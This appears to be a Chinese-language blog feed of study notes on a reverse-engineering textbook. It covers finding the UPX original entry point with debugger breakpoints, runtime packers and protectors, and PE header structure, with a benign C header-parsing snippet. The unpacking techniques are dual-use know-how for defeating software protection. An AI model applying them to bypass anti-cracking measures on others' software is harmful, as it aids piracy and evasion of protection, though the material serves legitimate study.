href="#15-4-快速查找UPX-OEP的方法" class="headerlink" title="15.4 快速查找UPX OEP的方法"></a>15.4 快速查找UPX OEP的方法</h1><p>各位都像上面这样顺利完成代码跟踪了吗？代码逆向技术的初学者一定要亲自试试，这有助于调试用其他压缩器压缩的文件。但每次都使用上述方法（跳出循环）查找OEP非常麻烦，实际代码逆向分析中有一些更简单的方法可以找到OEP （以UPX压缩的文件为例）。</p><h2 id="15-4-1-在POPAD指令后的JMP指令处设置断点"><a href="#15-4-1-在POPAD指令后的JMP指令处设置断点" class="headerlink" title="15.4.1 在POPAD指令后的JMP指令处设置断点"></a>15.4.1 在POPAD指令后的JMP指令处设置断点</h2><p>UPX压缩器的特征之一是，其EP代码被包含在PUSHAD&#x2F;POPAD指令之间。并且，跳转到OEP代码的JMP指令紧接着岀现在POPAD指令之后。只要在JMP指令处设置好断点，运行后就能直接找到OEP。</p><ul><li>PUSHAD指令将8个通用寄存器（EAX~EDI）的值保存到栈。</li><li>POPAD指令把PUSHAD命令存储在栈的值再次恢复到各个寄存器。</li></ul><h2 id="15-4-2-在栈中设置硬件断点"><a href="#15-4-2-在栈中设置硬件断点" class="headerlink" title="15.4.2 在栈中设置硬件断点"></a>15.4.2 在栈中设置硬件断点</h2><p>该方法也利用UPX的PUSHAD&#x2F;POPAD指令的特点。在图15-3中执行01015330地址处的PUSHAD命令后，查看栈，如图15-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211214185006947.png" alt="图15-10"></p><p>EAX到EDI寄存器的值依次被存储到栈。从x32dbg的Dump窗口进入栈地址（006FF6C）。将 鼠标光标准确定位到006FF6C地址，使用鼠标右键菜单设置硬件断点，如图15-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211214185449096.png" alt="图15-11"></p><p>硬件断点是CPU支持的断点，最多可以设置4个。与普通断点不同的是，设置断点的指令执行完成后才暂停调试。在这种状态下运行，程序就会边解压缩边执行代码，在执行POPAD的瞬间访问设置有硬件断点的0006FFA4地址，然后暂停调试。其下方即是跳转到OEP的JMP指令（熟悉该方法的操作原理才能在以后调试各种文件时得心应手）。</p><h1 id="15-5-小结"><a href="#15-5-小结" class="headerlink" title="15.5 小结"></a>15.5 小结</h1><p>前面学习了有关调试UPX运行时压缩文件的内容。建议各位参照书中讲解亲自操作，通过逐一跳出各循环的方法查找OEP。经过这样一系列的实际操作后，相信各位的调试水平都会得到很大提高。</p><blockquote><p>Q.解压缩（Unpacking）过程中打开Dump窗口，若不重新设置IAT就会出现初始化错误。这到底是怎么一回事？ </p><p>A.比如，运行UPX文件后转储时，IAT中存在（对应于当前系统的）准确的API地址。但是INT却处于损坏状态。<br>PE装栽器使用INT中的API名称字符串（LoadLibrary()&#x2F;GetProcAddress()）来获取实际API地址，并将它们记录到IAT。由于INT已经损坏，该过程中自然会发生错误。 </p><p>Q.很多汇编指令都不懂，请介绍可以查找汇编指令的网站吧，谢谢！ </p><p>A.此时，我通常会去查Intel的官方文档：<a href="http://www.intel.com/products/processor/manuals/%E3%80%82">http://www.intel.com/products/processor/manuals/。</a> </p><p>Q.如何知道ESI、EDI所指的地址对应于哪个节区的地址呢？我想知道该如何才能识别出恢复IAT的代码以及解码循环。 </p><p>A.内存复制命令中，ESI指Source，EDI指Destination。所以使用PEView （或者x32dbg的内存映射窗口）查看ESI&#x2F;EDI所指的地址，即可知道它们对应的节区。从反复调用GetProcAddress()函数可知，这是在恢复文件的IAT。此外，如果拥有丰富的解压缩经验，就更容易预测，这是刚刚接触的人无法企及的。</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第15章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第14章 运行时压缩</title>
    <link href="/1999/02/12/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC14%E7%AB%A0%20%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8E%8B%E7%BC%A9/"/>
    <url>/1999/02/12/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC14%E7%AB%A0%20%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8E%8B%E7%BC%A9/</url>
    
    <content type="html"><![CDATA[<p>第14章运行时压缩<br>运行时压缩器（Run-Time Packer）是软件逆向分析学的常见主题。为了理解好它，需要掌握有关PE文件格式、操作系统的基本知识（进程、内存、DLL等），同时也要了解有关压缩&#x2F;解压缩算法的基本内容。其中许多部分已经在前面讲解过了，学习运行时压缩能够进一步帮助大家把前面学过的逆向分析知识系统化，做到融会贯通。</p><h1 id="14-1-数据压缩"><a href="#14-1-数据压缩" class="headerlink" title="14.1 数据压缩"></a>14.1 数据压缩</h1><p>大家对于数据压缩都比较熟悉，下面简单梳理一下相关知识。数据压缩（DataCompression）是计算机工程的主要研究内容，经过数十年发展已经有了深入研究，今后还会不断岀现更多、更好的算法。</p><p>如果日常生活中能够非常容易地压缩某个物体该多么方便啊！也就不再需要仓库、停车场、集装箱了，当然，得能压缩才行。而在数码世界，（只要不是压缩过的信息）任何信息都能轻松压缩。</p><p>不论哪种形态的文件（数据）都是由二进制（ 0或1 ）组成的，只要使用合适的压缩算法，就能缩减其大小。经过压缩的文件若能100%恢复，则称该压缩为“无损压缩”（Lossless Data Compression ）；若不能恢复原状，则称该压缩为“有损压缩”（Loss Data Compression ）。</p><h2 id="14-1-1-无损压缩"><a href="#14-1-1-无损压缩" class="headerlink" title="14.1.1 无损压缩"></a>14.1.1 无损压缩</h2><p>无损压缩用来缩减文件（数据）的大小，压缩后的文件更易保管、移动。使用经过压缩的文件之前，需要先对文件解压缩（此过程中应该保证数据完整性）。</p><p>各位肯定用过类似7-zip、“面包房”的压缩程序，用它们压缩文件就是无损压缩算法。最具代表性的无损压缩算法有Run-Length、Lempel-Ziv、Huffman等。此外还有许多其他压缩算法，它们都是在上面3种压缩算法的基础上改造而成的。只要准确理解了上面3种，就能轻松掌握其他各种压缩算法。ZIP、RAR等是具有代表性的压缩文件格式，它们最根本的压缩理念也是Run-Length、Lempel-Ziv、Huffman,然后应用了一些各自特有的技术（压缩率、压缩&#x2F;解压时间）。</p><h2 id="14-1-2-有损压缩"><a href="#14-1-2-有损压缩" class="headerlink" title="14.1.2 有损压缩"></a>14.1.2 有损压缩</h2><p>相反，有损压缩允许压缩文件（数据）时损失一定信息，以此换取高压缩率。压缩多媒体文件）jpg, mp3、mp4）时，大部分都使用这种有损压缩方式。从压缩特性来看，有损压缩的数据解压缩后不能完全恢复原始数据。入类的肉眼与听觉几乎无法察觉到这些多媒体文件在压缩中损失的数据。经过有损压缩后，虽然压缩文件与原文件（从数据层面上看）存在差异，但重要的是入们几乎区分不出这种微小的差别。以mp3文件为例，mp3的核心算法通过删除超越入类听觉范围（20〜20000Hz）的波长区段来缩减（不需要的）数据大小。</p><h1 id="14-2-运行时压缩器"><a href="#14-2-运行时压缩器" class="headerlink" title="14.2 运行时压缩器"></a>14.2 运行时压缩器</h1><p>顾名思义，运行时压缩器是针对可执行（PE，Portable Executable ）文件而言的，可执行文件内部含有解压缩代码，文件在运行瞬间于内存中解压缩后执行。运行时压缩文件也是PE文件，内部含有原PE文件与解码程序。在程序的EP代码中执行解码程序，同时在内存中解压缩后执行。表14-1列出了运行时压缩与普通ZIP压缩的不同点。</p><p>表14-1普通压缩与运行时压缩的比较<br>项 目 普通压缩 运行时压缩<br>对象文件 所有文件 PE文件）exe、dll、sys）<br>压缩结果 压缩文件（zip、rar） PE文件）exe、dll、sys）<br>解压缩方式 使用专门解压缩程序 内部含有解码程序<br>文件是否可执行 本身不可执行 本身可执行<br>优点 可以对所有文件以高压缩率压缩 无须专门解压程序便可直接运行<br>缺点 若无专门解压缩软件则无法使用压缩文件 每次运行均需调用解码程序导致运行时间过长</p><p>与普通压缩器相比，运行时压缩器的一个明显不同是“PE文件的可运行性”。把普通PE文件创建成运行时压缩文件的实用程序称为“压缩器”（Packer）,经反逆向）Anti-Reversing ）技术特别处理的压缩器称为保护器（Protector ）。</p><h2 id="14-2-1压缩器"><a href="#14-2-1压缩器" class="headerlink" title="14.2.1压缩器"></a>14.2.1压缩器</h2><p>PE压缩器是指可执行文件的压缩器，准确一点应该称为“运行时压缩器”，它是PE文件的专<br>用压缩器。</p><p>#1.使用目的<br>•缩减PE文件的大小<br>文件尺寸小是其突出的优点之一，更便于网络传输与保存。 •隐藏PE文件内部代码与资源使用压缩器的另一个原因在于，它可以隐藏PE文件内的代码及资源（字符串、API名称字符串）等。压缩后的数据以难以辨识的二进制文件保存，从文件本身来看，这能有效隐藏内部代码与资源（当然解压缩后可以通过内存的Dump窗口查看）。 .</p><p>#2.使用现状<br>运行时压缩的概念早在DOS时代就岀现了，可当时并未广泛使用。因为那时的PC速度不怎么快，每次执行文件时，解压缩的过程会引起很大的系统开销。而现在的PC速度已经变得非常快，用户不能明显察觉运行时压缩文件与源文件在执行时间上的差别。因此，现在的实用程序、 “打补丁”文件、普通程序等都广泛应用运行时压缩。 </p><p>#3.压缩器种类<br>下面介绍几个有名的压缩器。PE压缩器大致可分为两类：一类是单纯用于压缩普通PE文件的压缩器；另一类是对源文件进行较大变形、严重破坏PE头、意图稍嫌不纯的压缩器。这里说的“意图不纯的压缩器”是指专门用于恶意程序（如：Virtus、Trojan, Worm等）的压缩器。本书中出现的“纯粹与不纯粹”的划分标准基于我的经验以及<a href="http://www.virustotal.com网站诊断的结果./">www.virustotal.com网站诊断的结果。</a></p><blockquote><p>目的纯粹的压缩器（未经VirusTotal诊断）：UPX、ASPack等。<br>目的不纯的压缩器（经VirusTotal诊断）：UPack、PESpin、NSAnti等</p></blockquote><h2 id="14-2-2保护器"><a href="#14-2-2保护器" class="headerlink" title="14.2.2保护器"></a>14.2.2保护器</h2><p>PE保护器是一类保护PE文件免受代码逆向分析的实用程序。它们不像普通的压缩器一样仅对PE文件进行运行时压缩，而应用了多种防止代码逆向分析的技术（反调试、反模拟、代码混乱、多态代码、垃圾代码、调试器监视等）。这类保护器使压缩后的PE文件尺寸反而比源文件要大一些，调试起来非常难。</p><p>详细分析保护器需要丰富的逆向分析经验。当然，网络上提供了各种解除保护器的技巧，运气好的话，即便是新手也可能顺利找到源文件的OEP ）Original Entry Point,原始入口点），但大多数情况没这么幸运。</p><p>#1.使用目的</p><ul><li>防止破解<br>相信没入愿意自己编写的程序被非法破解并使用。此时使用保护器可有效保护PE文件。</li><li>保护代码与资源保护器不仅可以保护PE文件本身，还可在文件运行时保护进程内存，防止打开Dump窗口。因此，使用保护器可以比较安全地保护程序自身的代码与资源。</li></ul><p>#2.使用现状<br>这类保护器大量应用于对破解很敏感的安全程序。比如安装在线游戏时会自动安装安全保护程序，游戏安全保护程序就是为了防止游戏“破解工具”运行的。</p><p>恶意的游戏破解者总是想方设法破解游戏的安全保护程序，因为破解成功后他们可以利用“游戏内核”获取金钱回报。所以，安全保护程序为了防止恶意破解而使用各种保护器来保护自己（不断更换保护器会让游戏破解者们发疯）。</p><p>另一方面，常见的恶性代码（Trojan, Worm）中也大量使用保护器来防止（或降低）杀毒软件的检测。有些保护器还能提供“多变的代码”，每次都会生成不同形态（但功能相同\的代码，这给病毒诊断带来很大困难。 </p><p>#3.保护器种类</p><p>保护器种类多样，有公用程序、商业程序，还有专门供恶意代码使用的保护器。</p><blockquote><p>商用保护器：ASProtect、Themida, SVKP等。<br>公用保护器：UltraProtect, Morphine等。</p></blockquote><blockquote><p>压缩器与保护器在代码逆向分析学习中占有非常重要的地位。开始分析PE文件时 必须先转到PE文件的OEP处才行，这就要求分析者拥有大量相关知识。此外，分析 压缩器与保护器本身也能学到很多，对提高逆向分析技术有很大帮助。保护器中使用的反调试技术往往水平非常高，需要具备关于CPU与OS的精深知识。</p></blockquote><h1 id="14-3-运行时压缩测试"><a href="#14-3-运行时压缩测试" class="headerlink" title="14.3 运行时压缩测试"></a>14.3 运行时压缩测试</h1><p>本节将以notepad.exe为例进行运行时压缩测试。</p><blockquote><p>本节示例使用的是Windows XP SP3中的notepad.exe程序。</p><p>但调试环境是Win7</p></blockquote><p>我使用的压缩器为UPX，它操作简单、功能强大，且完全免费，受到很多入的青睐。</p><p>进入 <a href="http://upx.sourceforge.net/">http://upx.sourceforge.net</a> 网站，下载 “Win32 Console Version” 后在命令行窗口运行，岀现图14-1所示的界面，显示岀UPX的使用说明。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC14%E7%AB%A0%20%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8E%8B%E7%BC%A9.assets/image-20211208102345575.png" alt="图14-1"></p><p>把notepad.exe文件复制到工作文件夹后，使用如图14-2所示的命令参数，对notepad.exe文件进行运行时压缩。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC14%E7%AB%A0%20%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8E%8B%E7%BC%A9.assets/image-20211208102517648.png" alt="图14-2"></p><p>从列出的压缩摘要中可以看到，压缩后的文件尺寸明显减小了（66560→48128 ）。若使用ZIP压缩，则文件大小缩减为35231。也就是说，运行时的压缩率要比普通的ZIP压缩低一些，这是由 于其压缩后得到的是PE文件，需要添加PE头，并且还要放入解压缩代码。</p><p><strong>比较 notepad.exe 与 notepad_upx.exe 文件</strong></p><p>图14-3是从PE文件视角比较2个文件的示意图，很好地反映出了UPX压缩器的特点（选用不同类型的压缩器与选项，运行时压缩文件的形态也不相同）。</p><ul><li>PE头的大小一样（0〜400h）。 </li><li>节区名称改变（“.text” → “UPX0”，“.data” → “UPX1”）</li><li>第一个节区的RawDataSize&#x3D;0 ）文件中的大小为0）。</li><li>EP位于第二个节区（原notepad.exe的EP在第一个节区）。</li><li>资源节区）.rsrc）大小几乎无变化。</li></ul><p>需要引起注意的是，第一个节区（UPX0）的RawDataSize为0，即第一个节区在磁盘文件中是不存在的。UPX为何要创建这个空的节区呢？下面使用LordPE查看第一个节区头，如图14-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC14%E7%AB%A0%20%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8E%8B%E7%BC%A9.assets/image-20211208103017775.png" alt="图14-4"></p><p>从VirtualSize值可以发现蛛丝马迹。第一个节区的VirtualSize值竟被设置为10000 ）而SizeOfRawData值为0 ）。这就是说，经过UPX压缩后的PE文件在运行瞬间将（文件中的）压缩的 代码解压到（内存中的）第一个节区。说得更详细一点，在磁盘文件中，解压缩代码与压缩的源代码都在第二个节区。文件运行时首先执行解压缩代码，把处于压缩状态的源代码解压到第一个节区。解压过程结束后即运行源文件的EP代码。</p><p>下一章将使用调试器调试实际的解压缩过程。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第14章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第13章 PE文件格式</title>
    <link href="/1999/02/11/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    <url>/1999/02/11/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>本章将详细讲解Windows操作系统的PE（Portable Executable）文件格式相关知识。学习PE文件格式的过程中，也一起整理一下有关进程、内存、DLL等的内容，它们是Windows操作系统最核心的部分。</p><h1 id="13-1-介绍"><a href="#13-1-介绍" class="headerlink" title="13.1 介绍"></a>13.1 介绍</h1><p>PE文件是Windows操作系统下使用的可执行文件格式。它是微软在UNIX平台的COFF（Common Object File Format，通用对象文件格式）基础上制作而成的。最初（正如Portable这个单词所代表的那样）设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在Windows系列的操作系统下。</p><p>PE文件是指32位的可执行文件，也称为PE32。64位的可执行文件称为PE+或PE32+，是PE（PE32）文件的一种扩展形式（请注意不是PE64 ）。</p><h1 id="13-2-PE文件格式"><a href="#13-2-PE文件格式" class="headerlink" title="13.2 PE文件格式"></a>13.2 PE文件格式</h1><p>PE文件种类如下表所示。</p><table><thead><tr><th>种类</th><th>主拓展名</th></tr></thead><tbody><tr><td>可执行系列</td><td>EXE、SCR</td></tr><tr><td>库系列</td><td>DLL、OCX、CPL、DRV</td></tr><tr><td>驱动程序系列</td><td>SYS、VXD</td></tr><tr><td>对象文件系列</td><td>OBJ</td></tr></tbody></table><p>严格地说，OBJ （对象）文件之外的所有文件都是可执行的。DLL、SYS文件等虽然不能直接在Shell （Explorer.exe）中运行，但可以使用其他方法（调试器、服务等）执行。</p><blockquote><p>根据PE正式规范，编译结果OBJ文件也视为PE文件。但是OBJ文件本身不能以任何形式执行，在代码逆向分析中几乎不需要关注它。</p></blockquote><p>下面以记事本（notepad.exe）程序进行简单说明，首先使用Hex Editor打开记事本程序。 </p><p>下图是notepad.exe文件的起始部分，也是PE文件的头部分（PE header）。notepad.exe文件运行需要的所有信息就存储在这个PE头中。如何加载到内存、从何处开始运行、运行中需要的DLL有哪些、需要多大的栈&#x2F;堆内存等，大量信息以结构体形式存储在PE头中。换言之，学习PE文件格式就是学习PE头中的结构体。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211203222319938.png" alt="image-20211203222319938"></p><p>书中将以Windows XP SP3的notepad.exe为例进行说明，与其他版本Windows下 的notepad.exe文件结构类似，但是地址不同。在我的随书实验过程中，我使用的是32位win7的文件夹底下的notepad进行实验。</p><h2 id="13-2-1-基本结构"><a href="#13-2-1-基本结构" class="headerlink" title="13.2.1 基本结构"></a>13.2.1 基本结构</h2><p>notepad.exe具有普通PE文件的基本结构。下图描述了notepad.exe文件加载到内存时的情形。<br>其中包含了许多内容，下面逐一学习。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211203222351309.png" alt="image-20211203222351309"></p><p>从DOS头（DOS header）到节区头（Section header）是PE头部分，其下的节区合称PE体。文件中使用偏移（offset），内存中使用VA （Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区的大小、位置等）。文件的内容一般可分为代码（.text）、数据（.data ）、资源（.rsrc ）节，分别保存。</p><blockquote><p>根据所用的不同开发工具（VB&#x2F;VC++&#x2F;Delphi&#x2F;etc）与编译选项，节区的名称、大小、<br>个数、存储的内容等都是不同的。最重要的是它们按照不同的用途分类保存到不同的节中。</p></blockquote><p>各节区头定义了各节区在文件或内存中的大小、位置、属性等。</p><p>PE头与各节区的尾部存在一个区域，称为NULL填充（NULL padding）。计算机中，为了提高处理文件、内存、网络包的效率，使用“最小基本单位”这一概念，PE文件中也类似。文件&#x2F;内存中节区的起始位置应该在各文件&#x2F;内存最小单位的倍数位置上，空白区域将用NULL填充（看上图，可以看到各节区起始地址的截断都遵循一定规则）。</p><h2 id="13-2-2-VA-amp-RVA-amp-FOA-RAW"><a href="#13-2-2-VA-amp-RVA-amp-FOA-RAW" class="headerlink" title="13.2.2 VA&amp;RVA&amp;FOA(RAW)"></a>13.2.2 VA&amp;RVA&amp;FOA(RAW)</h2><p>VA指的是进程虚拟内存的绝对地址，RVA ( Relative Virtual Address,相对虚拟地址）指从某个基准位置(ImageBase )开始的相对地址。</p><p>VA与RVA满足的换算关系为<code>RVA+ImageBase=VA</code></p><p>PE头内部信息大多以RVA形式存在。原因在于，PE文件（主要是DLL)加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他PE文件（DLL )。此时必须通过重定位（Relocation )将其加载到其他空白的位置，若PE头信息使用的是VA，则无法正常访问。因此使用RVA来定位信息，即使发生了重定位，只要相对于基准位置的相对地址没有变化，就能正常访问到指定信息，不会出现任何问题</p><p>至于FOV的话就比较简单，它是文件中的偏移地址</p><blockquote><p>32位Windows OS中，各进程分配有4GB的虚拟内存，因此进程中VA值的范围是00000000〜FFFFFFFF。</p></blockquote><h1 id="13-3-PE头"><a href="#13-3-PE头" class="headerlink" title="13.3 PE头"></a>13.3 PE头</h1><p>PE头由许多结构体组成，现在开始逐一学习各结构体。此外还会详细讲解在代码逆向分析中起着重要作用的结构体成员。</p><h2 id="13-3-1-DOS-头"><a href="#13-3-1-DOS-头" class="headerlink" title="13.3.1 DOS 头"></a>13.3.1 DOS 头</h2><p>微软创建PE文件格式时，入们正广泛使用DOS文件，所以微软充分考虑了PE文件对DOS文件的兼容性。其结果是在PE头的最前面添加了一个IMAGE_DOS_HEADER结构体，用来扩展已有的DOS EXE头。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">IMAGE_DOS_HEADER STRUCT<br>&#123;<br>+<span class="hljs-number">0</span>h WORD e_magic    <span class="hljs-regexp">//</span> Magic DOS signature MZ(<span class="hljs-number">4</span>Dh <span class="hljs-number">5</span>Ah)DOS可执行文件标记<br>+<span class="hljs-number">2</span>h WORD e_cblp    <span class="hljs-regexp">//</span> Bytes on last page of file<br>+<span class="hljs-number">4</span>h WORD e_cp    <span class="hljs-regexp">//</span> Pages <span class="hljs-keyword">in</span> file<br>+<span class="hljs-number">6</span>h WORD e_crlc    <span class="hljs-regexp">//</span> Relocations<br>+<span class="hljs-number">8</span>h WORD e_cparhdr   <span class="hljs-regexp">//</span> Size of header <span class="hljs-keyword">in</span> paragraphs<br>+<span class="hljs-number">0</span>ah WORD e_minalloc   <span class="hljs-regexp">//</span> Minimun extra paragraphs needs<br>+<span class="hljs-number">0</span>ch WORD e_maxalloc  <span class="hljs-regexp">//</span> Maximun extra paragraphs needs<br>+<span class="hljs-number">0</span>eh WORD e_ss           <span class="hljs-regexp">//</span> intial(relative)SS value        DOS代码的初始化堆栈SS<br>+<span class="hljs-number">10</span>h WORD e_sp     <span class="hljs-regexp">//</span> intial SP value                      DOS代码的初始化堆栈指针SP<br>+<span class="hljs-number">12</span>h WORD e_csum     <span class="hljs-regexp">//</span> Checksum<br>+<span class="hljs-number">14</span>h WORD e_ip     <span class="hljs-regexp">//</span> intial IP value               DOS代码的初始化指令入口[指针IP]<br>+<span class="hljs-number">16</span>h WORD e_cs     <span class="hljs-regexp">//</span> intial(relative)CS value         DOS代码的初始堆栈入口<br>+<span class="hljs-number">18</span>h WORD e_lfarlc     <span class="hljs-regexp">//</span> File Address of relocation table<br>+<span class="hljs-number">1</span>ah WORD e_ovno         <span class="hljs-regexp">//</span> Overlay number<br>+<span class="hljs-number">1</span>ch WORD e_res[<span class="hljs-number">4</span>]      <span class="hljs-regexp">//</span> Reserved words<br>+<span class="hljs-number">24</span>h WORD e_oemid      <span class="hljs-regexp">//</span> OEM identifier(<span class="hljs-keyword">for</span> e_oeminfo)<br>+<span class="hljs-number">26</span>h WORD e_oeminfo   <span class="hljs-regexp">//</span> OEM information;e_oemid specific<br>+<span class="hljs-number">29</span>h WORD e_res2[<span class="hljs-number">10</span>]   <span class="hljs-regexp">//</span> Reserved words<br>+<span class="hljs-number">3</span>ch DWORD e_lfanew     <span class="hljs-regexp">//</span>  Offset to start of PE header      指向PE文件头<br>&#125; IMAGE_DOS_HEADER ENDS<br></code></pre></td></tr></table></figure><h3 id="自实现代码解析"><a href="#自实现代码解析" class="headerlink" title="自实现代码解析"></a>自实现代码解析</h3><p>IMAGE_DOS_HEADER结构体的大小为40个字节。在其中最重要的两个字段如下：</p><p>e_magic：一个WORD类型，值是一个常数0x4D5A，用文本编辑器查看该值位‘MZ’，可执行文件必须都是’MZ’开头。<br>e_lfanew：为32位可执行文件扩展的域，用来表示DOS头之后的NT头相对文件起始地址的偏移。</p><p>使用Hex Editor打开notepad.exe，查看IMAGE_DOS_HEADERS结构体，可以看上面打开的图。根据PE规范，文件开始的2个字节为4D5A，e_lfanew值为000000E0（不是E0000000）。</p><blockquote><p>Intel系列的CPU以逆序存储数据，这称为小端序标识法。</p></blockquote><p>自己写代码可以加深对PE头的理解，接下来手写代码解析MS-DOS头：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    FILE *pFile = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> *buffer;<br>    <span class="hljs-type">int</span> nFileLength = <span class="hljs-number">0</span>;<br>    pFile = fopen(<span class="hljs-string">&quot;C:\\Users\\shinelon\\Desktop\\notepad.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    fseek(pFile, <span class="hljs-number">0</span>, SEEK_END); <span class="hljs-comment">// 将文件位置指针定位到文件结尾，从SEEK_END开始，偏移0个字节</span><br>    nFileLength = ftell(pFile); <span class="hljs-comment">//返回当前文件位置指针相对于文件开始的距离，在这里就是文件的大小</span><br>    rewind(pFile); <span class="hljs-comment">//将文件位置指针倒回文件开始</span><br>    <span class="hljs-type">int</span> imageLength = nFileLength * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>) + <span class="hljs-number">1</span>;<br>    buffer = (<span class="hljs-type">char</span> *) <span class="hljs-built_in">malloc</span>(imageLength);<br>    <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, imageLength);<br>    fread(buffer, <span class="hljs-number">1</span>, imageLength, pFile);<br><br>    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>, dosHeader-&gt;e_magic);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>, dosHeader-&gt;e_lfanew);<br><br>    <span class="hljs-built_in">free</span>(buffer);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13-3-2-DOS存根"><a href="#13-3-2-DOS存根" class="headerlink" title="13.3.2 DOS存根"></a>13.3.2 DOS存根</h2><p>DOS存根（stub）在DOS头下方，是个可选项，且大小不固定（即使没有DOS存根，文件也能正常运行）。DOS存根由代码与数据混合而成，下图显示的就是notepad.exe的DOS存根。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211203225009480.png" alt="image-20211203225009480"></p><p>上图中，文件偏移40~4D区域为16位的汇编指令。32位的Windows OS中不会运行该命令（由于被识别为PE文件，所以完全忽视该代码）。在DOS环境中运行Notepad.exe文件，或者使用DOS调试器（debug.exe）运行它，可使其执行该代码（不认识PE文件格式，所以被识别为DOS EXE文件）。</p><p>打开命令行窗口（cmd.exe），输入如下命令（仅适用于Windows XP环境）。</p><p>debug C:\Windows\notepad.exe</p><p>在出现的光标位置上输入“u”指令（Unassemble），将会岀现16位的汇编指令，如下所示。</p><p><img 